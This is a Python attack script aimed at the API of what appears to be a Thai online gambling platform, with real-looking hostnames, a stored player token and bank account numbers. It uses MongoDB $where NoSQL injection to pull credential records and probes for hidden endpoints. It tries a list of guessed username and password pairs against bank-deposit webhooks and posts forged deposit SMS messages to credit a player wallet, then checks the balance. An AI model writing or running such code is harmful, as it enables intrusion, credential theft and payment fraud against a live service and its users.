#!/usr/bin/env python3
"""probe_sms_inject.py — SMS injection into webhook endpoints.

   Strategy:
   1. Use NoSQL $where injection on pbapi to find device/webhook credential collections
   2. Probe all pbapi endpoints for device/C2 credential leaks
   3. Send crafted SMS payloads to /webhook-kbank + /webhook-scb with all known creds
   4. Try alternative webhook paths the APK might use

   APK ReadSmsRequest body fields:
     address, message, timestamp, bank_no, sms_id, type, bank_code,
     username, password, amount
"""
import json, pathlib, requests, time, uuid

TID    = "af6efb584a3d317b5a11ab6209b88e1b"
MGAPI  = f"https://{TID}mgapi.asdgapicenterssdo.com"
PBAPI  = f"https://{TID}pbapi.asdgapicenterssdo.com"
JWT    = pathlib.Path("/home/kzp/claude-red/.jwt.vak88z2").read_text().strip()
PAPDIEAW = "649e854e68c88b4fbfa611534e740a10c2c87f42582ae150aad2c3aa49092d80"
DOMAIN = "m.vak88z2.com"

TS = int(time.time())

def hdrs_player():
    return {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json",
            "template": "vn", "correlationid": f"si-{TS}",
            "languagecode": "th", "Origin": f"https://{DOMAIN}"}

def sms_body(bank_code, bank_no, username, password, amount="100.00"):
    """ReadSmsRequest format from APK analysis."""
    return {
        "address": bank_code,
        "message": f"{bank_code} {time.strftime('%d/%m/%y')} {time.strftime('%H:%M')} +{amount} ธนวัฒน์ ref {bank_code[:2]}{TS % 100000:05d}",
        "timestamp": TS,
        "bank_no": bank_no,
        "sms_id": f"{bank_code.lower()}_{TS}_{uuid.uuid4().hex[:8]}",
        "type": "deposit",
        "bank_code": bank_code,
        "username": username,
        "password": password,
        "amount": amount,
    }

# ── 1. NoSQL injection to find device credential collections ──────────────────
print("=== NoSQL $where injection — device/webhook credential hunt ===")
# The C2 stores device provisioning (username/password per bank) somewhere accessible
# pbapi has MongoDB. Try to find collections with webhook credentials.

nosql_probes = [
    # Find any document that has a 'password' field (device creds)
    ("latest-win", "$where=this.password && this.username", "password+username fields"),
    # Find webhook config documents
    ("latest-win", "$where=this.webhook_username", "webhook_username field"),
    ("latest-win", "$where=this.bank_code && this.password", "bank_code+password"),
    # Find any doc with 'kbank' or 'scb' in any field
    ("latest-win", "$where=JSON.stringify(this).indexOf('kbank')>-1", "kbank in doc"),
    ("latest-win", "$where=JSON.stringify(this).indexOf('webhook')>-1", "webhook in doc"),
    # Endpoints that might expose different collections
    ("latest-withdraw", "$where=this.password", "withdraw+password"),
    ("latest-withdraw", "$where=this.webhook_password", "withdraw+webhook_password"),
]

for ep, qs, label in nosql_probes:
    url = f"{PBAPI}/pb/{ep}?domain={DOMAIN}&{qs}"
    try:
        r = requests.get(url, timeout=12)
        body = r.text[:400]
        if r.status_code == 200:
            data = r.json()
            total = data.get("total", 0)
            items = data.get("data", [])
            if total > 0 or items:
                print(f"  [!!!] {label}: total={total} items={len(items)}")
                for item in items[:2]:
                    # Print interesting fields
                    print(f"    item keys: {list(item.keys())}")
                    for k in ["username", "password", "webhook_username", "webhook_password",
                              "bank_code", "kbank_username", "scb_username"]:
                        if k in item:
                            print(f"    {k}: {item[k]}")
            else:
                print(f"  {label}: empty (total=0)")
        else:
            print(f"  {label}: HTTP {r.status_code}: {body[:120]}")
    except Exception as e:
        print(f"  {label}: {e}")

# ── 2. Probe pbapi for other collections / endpoints ─────────────────────────
print("\n=== pbapi endpoint discovery for device/webhook data ===")
pbapi_paths = [
    "/pb/device",
    "/pb/devices",
    "/pb/webhook",
    "/pb/webhooks",
    "/pb/webhook-config",
    "/pb/device-credential",
    "/pb/bank-webhook",
    "/pb/sms-device",
    "/pb/lux-device",
    # FeathersJS services auto-map collection names
    "/pb/lux_sms",
    "/pb/sms_config",
    "/pb/bank_config",
    "/pb/deposit-webhook",
    "/pb/kbank",
    "/pb/scb",
]

for path in pbapi_paths:
    try:
        url = f"{PBAPI}{path}?domain={DOMAIN}&$limit=5"
        r = requests.get(url, headers={"Content-Type": "application/json"}, timeout=8)
        if r.status_code not in (404, 405):
            print(f"  {path}: HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"  {path}: {e}")

# Also try with player JWT
for path in ["/pb/device", "/pb/webhook", "/pb/bank-webhook"]:
    try:
        url = f"{PBAPI}{path}?domain={DOMAIN}&$limit=5"
        r = requests.get(url, headers={**hdrs_player(), "Content-Type": "application/json"}, timeout=8)
        if r.status_code not in (404, 405):
            print(f"  (authed) {path}: HTTP {r.status_code}: {r.text[:200]}")
    except Exception as e:
        print(f"  (authed) {path}: {e}")

# ── 3. APK credential search — check if any hardcoded fallback creds in API ──
print("\n=== Hardcoded credential patterns from APK analysis ===")
# From ListApi.java: kbank/scb have NO header auth, only body creds
# From PrefUtil.java: all creds start empty, C2-provisioned
# Try: PAPDIEAW as body password (it's used as header in TrueWallet but might be body fallback)
# Try: common Thai gaming platform defaults
# Try: phone-format credentials

KBANK_ACCT = "0543753327"  # player's KBANK
SCB_ACCT   = "2373102108"  # autoslip SCB deposit account
KBANK_PLATFORM = "1029600000052"  # platform's KBANK deposit account (from bank-information)

creds = [
    # PAPDIEAW variants
    (PAPDIEAW, PAPDIEAW, "papdieaw as both"),
    (PAPDIEAW, "123456", "papdieaw+123456"),
    ("lux", PAPDIEAW, "lux+papdieaw"),
    ("luxsms", PAPDIEAW, "luxsms+papdieaw"),
    # Platform account number as username
    (KBANK_PLATFORM, PAPDIEAW, "platform_kbank+papdieaw"),
    (KBANK_PLATFORM, "Aa112233", "platform_kbank+Aa112233"),
    # vak88z2 TID as credential
    (TID, TID, "tid as both"),
    (TID, "123456", "tid+123456"),
    ("vak88z2", "Aa112233", "vak88z2+Aa112233"),
    ("vak88z2", TID, "vak88z2+tid"),
    # Firebase project name
    ("we88zz", "we88zz", "we88zz as both"),
    ("we88zz", PAPDIEAW, "we88zz+papdieaw"),
    # Common SMS gateway patterns
    ("sms", "sms123456", "sms default"),
    ("bank", "bank123", "bank default"),
    ("deposit", "deposit", "deposit as both"),
    # Try with KBANK bank account number (provider's deposit account)
    (KBANK_PLATFORM, KBANK_PLATFORM, "platform acct as both"),
    # Numeric PIN patterns
    ("admin", "1234", "admin+1234"),
    ("admin", "000000", "admin+000000"),
    ("admin", "654321", "admin+654321"),
    # The platform auto-generate format
    ("Vak88z", "Vak88z", "Vak88z as both"),
    ("Vak88z", "vak88z2", "Vak88z+tenant"),
]

print("\n  === POST /webhook-kbank (ReadSmsRequest body auth) ===")
for username, password, label in creds:
    body = sms_body("KBANK", KBANK_PLATFORM, username, password, "100.00")
    try:
        r = requests.post(f"{MGAPI}/webhook-kbank",
                          headers={"Content-Type": "application/json"},
                          json=body, timeout=8)
        if r.status_code != 401:
            print(f"  [!!!] NON-401 ({label}): HTTP {r.status_code}: {r.text[:300]}")
        else:
            pass  # Silent for 401
    except Exception as e:
        print(f"  {label}: {e}")
print("  Done (all 401 = silent; non-401 shown above)")

print("\n  === POST /webhook-scb (ReadSmsRequest body auth) ===")
for username, password, label in creds[:8]:  # Just first 8 for SCB
    body = sms_body("SCB", SCB_ACCT, username, password, "100.00")
    try:
        r = requests.post(f"{MGAPI}/webhook-scb",
                          headers={"Content-Type": "application/json"},
                          json=body, timeout=8)
        if r.status_code != 401:
            print(f"  [!!!] NON-401 ({label}): HTTP {r.status_code}: {r.text[:300]}")
    except Exception as e:
        print(f"  {label}: {e}")
print("  Done (all 401 = silent; non-401 shown above)")

# ── 4. Try alternative webhook paths (the C2 dynamically provides URLs) ───────
print("\n=== Alternative webhook paths (C2 get-endpoint-webhook returns URL) ===")
# The C2 /service/deposit/get-endpoint-webhook might return non-standard paths
alt_paths = [
    "/webhook-kbank",
    "/webhook-scb",
    "/webhook-ktb",
    "/webhook-bay",
    "/webhook-bbl",
    "/webhooks/kbank",
    "/webhooks/scb",
    "/api/webhook-kbank",
    "/api/webhook/kbank",
    "/deposit/webhook",
    "/deposit/webhook/kbank",
    "/sms/kbank",
    "/sms/deposit",
    "/bank/kbank",
    "/mb/webhook-kbank",
    "/mb/webhook-scb",
]

# Test OPTIONS/GET first to see what paths exist
for path in alt_paths:
    try:
        r = requests.options(f"{MGAPI}{path}", timeout=5)
        if r.status_code not in (404, 405, 0):
            print(f"  OPTIONS {path}: HTTP {r.status_code}: Allow={r.headers.get('Allow','?')}")
    except:
        pass

# Try POST with our SMS body on alternative paths
test_body = sms_body("KBANK", KBANK_PLATFORM, "", "", "100.00")
for path in alt_paths[2:]:  # Skip the first two we already know
    try:
        r = requests.post(f"{MGAPI}{path}",
                          headers={"Content-Type": "application/json"},
                          json=test_body, timeout=5)
        if r.status_code not in (404, 405):
            print(f"  [!!!] POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    except:
        pass

# ── 5. Try mgapi direct SMS injection endpoints ───────────────────────────────
print("\n=== mgapi /mb/* SMS endpoints ===")
mb_paths = [
    "/mb/sms",
    "/mb/sms-deposit",
    "/mb/bank-notification",
    "/mb/deposit-notification",
    "/mb/bank-sms",
    "/mb/auto-deposit",
    "/mb/slip-deposit",
    "/mb/deposit-confirm",
]
auth_hdrs = {**hdrs_player(), "Content-Type": "application/json"}
sms_test = {
    "bank_code": "KBANK",
    "amount": 100.0,
    "account_no": KBANK_PLATFORM,
    "ref": f"K6B{TS%100000:05d}",
    "timestamp": TS,
    "message": f"KBANK {time.strftime('%d/%m/%y')} {time.strftime('%H:%M')} +100.00 ธนวัฒน์",
}
for path in mb_paths:
    try:
        r = requests.post(f"{MGAPI}{path}", headers=auth_hdrs, json=sms_test, timeout=8)
        if r.status_code not in (404, 405):
            print(f"  POST {path}: HTTP {r.status_code}: {r.text[:200]}")
    except:
        pass

# ── 6. Try using PBAPI (FeathersJS) for SMS-related create operations ─────────
print("\n=== pbapi POST to SMS-related services ===")
pb_sms_services = ["/pb/latest-win", "/pb/sms", "/pb/deposit-sms", "/pb/kbank-sms"]
for svc in pb_sms_services:
    try:
        body = {
            "bank_code": "KBANK",
            "amount": 100.0,
            "bank_no": KBANK_PLATFORM,
            "message": sms_test["message"],
            "timestamp": TS,
            "domain": DOMAIN,
        }
        r = requests.post(f"{PBAPI}{svc}", headers=hdrs_player(), json=body, timeout=8)
        if r.status_code not in (404, 405, 403):
            print(f"  POST {svc}: HTTP {r.status_code}: {r.text[:200]}")
    except:
        pass

print("\n=== Wallet balance ===")
r = requests.get(f"{MGAPI}/mb/wallet", headers=hdrs_player(), timeout=10)
d = r.json() if r.ok else {}
print(f"  Balance: {d.get('balance', '?')}")

print("\n=== DONE ===")
